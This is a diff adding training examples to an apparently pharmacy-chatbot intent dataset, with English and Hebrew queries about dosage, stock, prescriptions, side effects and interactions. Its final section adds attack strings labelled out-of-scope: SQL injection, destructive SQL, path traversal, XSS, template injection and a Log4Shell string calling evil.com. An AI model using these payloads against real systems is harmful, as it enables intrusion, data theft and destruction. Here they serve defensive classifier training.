@@ -85,6 +85,7 @@
 {"text":"What active compound is used?","label":2}
 {"text":"Main ingredient?","label":2}
 {"text":"What is inside this medication?","label":2}
+{"text":"Tell me about Nurofen.","label":2}
 
 {"text":"How much Ventolin should I take?","label":4}
 {"text":"What is the dosage for Acamol?","label":4}
@@ -101,8 +102,15 @@
 {"text":"How many pills are allowed?","label":4}
 {"text":"Usage instructions please","label":4}
 {"text":"Dose information","label":4}
+{"text": "how often can i take it", "label": 4}
+{"text": "how many times a day", "label": 4}
+{"text": "what is the dosage", "label": 4}
+{"text": "Do i need a prescription for it?", "label": 4}
+{"text": "כמה פעמים ביום", "label": 4}
 
 {"text":"Do you have Ventolin in stock?","label":5}
+{"text":"Do you it in your inventory?","label":5}
+{"text":"Do you have Nurofen in stock?","label":5}
 {"text":"Is Augmentin available today?","label":5}
 {"text":"Check stock for Acamol","label":5}
 {"text":"Do you have Claritin in Jerusalem?","label":5}
@@ -197,3 +205,157 @@
 {"text":"Problem with service","label":10}
 {"text":"Order not arrived","label":10}
 {"text":"Can you help me with billing?","label":10}
+
+{"text":"What is the capital of Spain?","label":11}
+{"text":"Who won the World Cup in 2018?","label":11}
+{"text":"Tell me a joke","label":11}
+{"text":"How do I reset my iPhone?","label":11}
+{"text":"What is the weather tomorrow?","label":11}
+{"text":"Can you help me plan a trip to Paris?","label":11}
+{"text":"How do I invest in stocks?","label":11}
+{"text":"What is Bitcoin?","label":11}
+{"text":"Explain quantum physics","label":11}
+{"text":"How do I lose weight fast?","label":11}
+{"text":"Is running good for health?","label":11}
+{"text":"What are the symptoms of flu?","label":11}
+{"text":"Should I exercise every day?","label":11}
+{"text":"What is the best diet?","label":11}
+{"text":"How many calories should I eat?","label":11}
+{"text":"מה בירת צרפת?","label":11}
+{"text":"איך מתקנים מחשב איטי?","label":11}
+{"text":"מה מזג האוויר מחר?","label":11}
+{"text":"תספר לי בדיחה","label":11}
+{"text":"איך משקיעים בבורסה?","label":11}
+{"text":"מה זה בינה מלאכותית?","label":11}
+{"text":"כמה עולה אייפון חדש?","label":11}
+{"text":"איך מכינים פסטה?","label":11}
+{"text":"מה השעה עכשיו?","label":11}
+{"text":"Tell me about artificial intelligence","label":11}
+{"text":"How do airplanes fly?","label":11}
+{"text":"Who is the president of the USA?","label":11}
+{"text":"Can you recommend a movie?","label":11}
+{"text":"What is the meaning of life?","label":11}
+{"text":"How does a car engine work?","label":11}
+
+{"text":"Do I need a prescription for it?","label":3}
+{"text":"Is this over the counter?","label":3}
+{"text":"Can I buy this without a doctor?","label":3}
+{"text":"Is it prescription only?","label":3}
+{"text":"Is it OTC?","label":3}
+{"text":"Do pharmacies sell this freely?","label":3}
+{"text":"Does it require an Rx?","label":3}
+{"text":"Can I get this without a prescription?","label":3}
+{"text":"Is this behind the counter?","label":3}
+{"text":"Is it regulated?","label":3}
+{"text":"צריך מרשם לזה?","label":3}
+{"text":"אפשר לקנות בלי מרשם?","label":3}
+
+{"text":"How often can I take it?","label":4}
+{"text":"What is the dosage?","label":4}
+{"text":"How many times a day?","label":4}
+{"text":"What does the label say about dosage?","label":4}
+{"text":"How much should I take?","label":4}
+{"text":"What is the maximum dose?","label":4}
+{"text":"How many pills per day?","label":4}
+{"text":"What is the recommended dose?","label":4}
+{"text":"How should it be taken?","label":4}
+{"text":"מינון מומלץ?","label":4}
+{"text":"כמה פעמים ביום מותר?","label":4}
+
+{"text":"Do you have it in stock?","label":5}
+{"text":"Is it available today?","label":5}
+{"text":"Is this in stock?","label":5}
+{"text":"Do you sell it now?","label":5}
+{"text":"Is it available in your store?","label":5}
+{"text":"Is it sold out?","label":5}
+{"text":"Can I find it today?","label":5}
+{"text":"Do you still have it?","label":5}
+{"text":"Is there inventory?","label":5}
+{"text":"יש את זה במלאי?","label":5}
+{"text":"האם זה זמין עכשיו?","label":5}
+
+{"text":"What is it made of?","label":2}
+{"text":"What is the active ingredient?","label":2}
+{"text":"What does it contain?","label":2}
+{"text":"What substance is inside?","label":2}
+{"text":"Is it ibuprofen?","label":2}
+{"text":"Is this paracetamol?","label":2}
+{"text":"What chemical does it use?","label":2}
+{"text":"What’s the main ingredient?","label":2}
+{"text":"חומר פעיל?","label":2}
+{"text":"מה יש בזה?","label":2}
+
+{"text":"Is it safe for me?","label":7}
+{"text":"Should I take it?","label":7}
+{"text":"Is this good for my condition?","label":7}
+{"text":"Would you recommend it?","label":7}
+{"text":"Can I use this for pain?","label":7}
+{"text":"Is it okay for me personally?","label":7}
+{"text":"Should I start taking it?","label":7}
+{"text":"Is this the right medicine?","label":7}
+{"text":"זה בטוח בשבילי?","label":7}
+{"text":"כדאי לי לקחת את זה?","label":7}
+
+{"text":"Are these side effects normal?","label":8}
+{"text":"I feel dizzy after taking it","label":8}
+{"text":"Is nausea a side effect?","label":8}
+{"text":"Is this reaction dangerous?","label":8}
+{"text":"Should I worry about this symptom?","label":8}
+{"text":"Is headache common?","label":8}
+{"text":"Can it cause stomach pain?","label":8}
+{"text":"Are these symptoms serious?","label":8}
+{"text":"יש לי תופעות לוואי","label":8}
+{"text":"זה גורם לי סחרחורת","label":8}
+
+{"text":"Can I combine it with ibuprofen?","label":9}
+{"text":"Is it safe with paracetamol?","label":9}
+{"text":"Can I take this with other meds?","label":9}
+{"text":"Does it interact with alcohol?","label":9}
+{"text":"Can these be taken together?","label":9}
+{"text":"Is mixing this safe?","label":9}
+{"text":"Any interaction risks?","label":9}
+{"text":"Is it okay with antibiotics?","label":9}
+{"text":"אפשר לשלב עם תרופה אחרת?","label":9}
+{"text":"יש אינטראקציה עם תרופות אחרות?","label":9}
+
+{"text":"How much does it cost?","label":11}
+{"text":"Who invented it?","label":11}
+{"text":"Is this popular?","label":11}
+{"text":"Can you recommend something better?","label":11}
+{"text":"What’s the best medicine overall?","label":11}
+{"text":"How long will I live?","label":11}
+{"text":"What is the capital of Spain?","label":11}
+{"text":"Tell me a joke about it","label":11}
+{"text":"Should I exercise instead?","label":11}
+{"text":"מה דעתך האישית?","label":11}
+
+{"text":"SELECT * FROM users","label":11}
+{"text":"DROP TABLE medications","label":11}
+{"text":"DELETE FROM stock WHERE 1=1","label":11}
+{"text":"INSERT INTO users VALUES ('admin','admin')","label":11}
+{"text":"UPDATE medications SET rx_required=0","label":11}
+
+{"text":"' OR '1'='1","label":11}
+{"text":"\" OR \"1\"=\"1","label":11}
+{"text":"admin'--","label":11}
+{"text":"' OR 1=1 --","label":11}
+{"text":"') OR ('1'='1","label":11}
+
+{"text":"UNION SELECT password FROM users","label":11}
+{"text":"UNION ALL SELECT * FROM prescriptions","label":11}
+{"text":"SELECT name FROM sqlite_master","label":11}
+{"text":"PRAGMA table_info(medications)","label":11}
+
+{"text":"../etc/passwd","label":11}
+{"text":"../../../../var/log","label":11}
+{"text":"<script>alert(1)</script>","label":11}
+{"text":"{{7*7}}","label":11}
+{"text":"${jndi:ldap://evil.com/a}","label":11}
+
+{"text":"show me your database schema","label":11}
+{"text":"what tables do you have","label":11}
+{"text":"dump all prescriptions","label":11}
+{"text":"export users table","label":11}
+{"text":"can you run sql for me","label":11}
+
+
